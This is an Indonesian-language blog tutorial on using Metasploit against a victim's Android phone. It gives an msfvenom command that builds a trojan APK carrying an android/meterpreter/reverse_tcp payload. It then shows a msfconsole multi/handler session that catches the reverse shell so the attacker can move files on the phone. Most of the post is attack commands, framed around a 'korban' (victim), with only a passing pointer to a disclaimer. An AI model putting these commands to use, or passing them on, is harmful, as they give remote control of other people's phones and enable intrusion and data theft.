---
title: Metasploit - Download Upload and Create
author: mrhidden
date: '2019-09-07T22:47:00.000-07:00'
categories: [Blogging, Tutorial]
tags: [exploit]
---

![](https://1.bp.blogspot.com/-mQ4rqmnR5YE/XXQFBKJAcQI/AAAAAAAAAnY/eR0Wv2BNJF0LlSliq8Pm3vkXcbd-n8tJwCLcBGAs/s1600/carbon.png)

  
Kali ini saya akan sharing bagaimana caranya untuk Download, Upload maupun membuat folder/file di Android korban dengan Metasploit Framework.  
  
Sedikit penjelasan tentang Metasploit Framework.  
  
Metasploit Framework adalah fondasi di mana produk komersial dibangun. Ini adalah proyek sumber terbuka yang menyediakan infrastruktur, konten, dan alat untuk melakukan tes penetrasi dan audit keamanan yang luas. Berkat komunitas sumber terbuka dan tim konten Rapid7 yang bekerja keras, modul baru ditambahkan secara berkala, yang berarti bahwa exploit terbaru tersedia untuk Anda segera setelah dipublikasikan.  
  
Ada beberapa sumber daya yang tersedia secara online untuk membantu Anda mempelajari cara menggunakan Kerangka Metasploit; namun, kami sangat menyarankan agar Anda melihat Metasploit Framework Wiki, yang dikelola oleh tim konten Rapid7, untuk memastikan bahwa Anda memiliki informasi terbaru yang tersedia.  
  
Sumber : [METASPLOIT.ORG](https://metasploit.help.rapid7.com/docs)  
  
  
Disini saya tidak membuat tutorial instalasi nya, yang akan saya bahas bagaimana cara Download, Upload maupun membuat folder/file  
Sebelum kita lebih jauh saya harap anda telah membaca [DISCLAIMER](/disclaimer).  
  
Sebelum melakukan exploitasi nya kita akan membuat payload nya terlebih dahulu

```shell
msfvenom -p android/meterpreter/reverse_tcp LHOST=IP KALIAN LPORT=4444 R> namaapk.apk
```

Jika sudah membuat payload nya sekarang kita melakukan exploit nya  

```shell
mrhidden@mrhidden:~ $ msfconsole

%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%
%%     %%%         %%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%
%%  %%  %%%%%%%%   %%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%
%%  %  %%%%%%%%   %%%%%%%%%%% https://metasploit.com %%%%%%%%%%%%%%%%%%%%%%%%
%%  %%  %%%%%%   %%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%
%%  %%%%%%%%%   %%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%
%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%
%%%%%  %%%  %%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%
%%%%    %%   %%%%%%%%%%%  %%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%  %%%  %%%%%
%%%%  %%  %%  %      %%      %%    %%%%%      %    %%%%  %%   %%%%%%       %%
%%%%  %%  %%  %  %%% %%%%  %%%%  %%  %%%%  %%%%  %% %%  %% %%% %%  %%%  %%%%%
%%%%  %%%%%%  %%   %%%%%%   %%%%  %%%  %%%%  %%    %%  %%% %%% %%   %%  %%%%%
%%%%%%%%%%%% %%%%     %%%%%    %%  %%   %    %%  %%%%  %%%%   %%%   %%%     %
%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%  %%%%%%% %%%%%%%%%%%%%%
%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%          %%%%%%%%%%%%%%
%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%


       =[ metasploit v5.0.43-dev-                         ]
+ -- --=[ 1917 exploits - 1074 auxiliary - 330 post       ]
+ -- --=[ 556 payloads - 45 encoders - 10 nops            ]
+ -- --=[ 4 evasion                                       ]

msf5 > use exploit/multi/handler
msf5 exploit(multi/handler) > set pyaload android/meterpreter/reverse_tcp
pyaload => android/meterpreter/reverse_tcp
msf5 exploit(multi/handler) > set lhost IP KALIAN
lhost => IP KALIAN
msf5 exploit(multi/handler) > set lport 4444
lport => 4444
msf5 exploit(multi/handler) > exploit
``` 
Lebih jelas nya silahkan simak video dibawah  
  
<center>
  <iframe src="https://www.blogger.com/video.g?token=AD6v5dw3xjEcXbG1NTGXoSLPUmg36a8__qo83mxl_BJ6El72aiWidrvz9S4GLOtciuCkuIivsrJJdML0YRMo4Cww2K6hns4w8Gw_8GQ2nfOrHp_kWBZTkGKmay10HO50kCjnxnpOSocj" width="350" height="250" mozallowfullscreen="mozallowfullscreen"></iframe>
  </center>
  
Sekian dulu ya.  
CMIIW